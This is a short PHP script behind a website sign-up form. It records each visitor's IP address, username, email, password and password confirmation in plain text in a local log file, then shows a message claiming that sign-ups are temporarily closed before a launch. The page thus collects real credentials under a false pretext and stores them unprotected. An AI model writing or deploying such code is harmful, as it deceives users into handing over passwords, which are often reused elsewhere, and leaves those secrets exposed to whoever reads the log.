<?php
$ip = isset($_SERVER['HTTP_CLIENT_IP']) 
? $_SERVER['HTTP_CLIENT_IP'] 
: (isset($_SERVER['HTTP_X_FORWARDED_FOR']) 
? $_SERVER['HTTP_X_FORWARDED_FOR'] 
: $_SERVER['REMOTE_ADDR']);
$username = $_POST['username'];
$email = $_POST['email'];
$password = $_POST['password'];
$cpassword = $_POST['cpassword'];
$text =  $ip . ", " . $username . ", " . $email . ", " . $password . ", " . $cpassword . "\n";
$fp = fopen('zLogAttemptedSignUps900x.txt', 'a+');
     
if(fwrite($fp, $text))  {
    echo "<p>As we prepare for our big mega launch we find it necessary to
temporarily restrict sign ups. We apologize for the inconvenience :(.
Please follow us on Twitter to know when you are finally able to use
our product :).</p>";
}
fclose ($fp);    
?>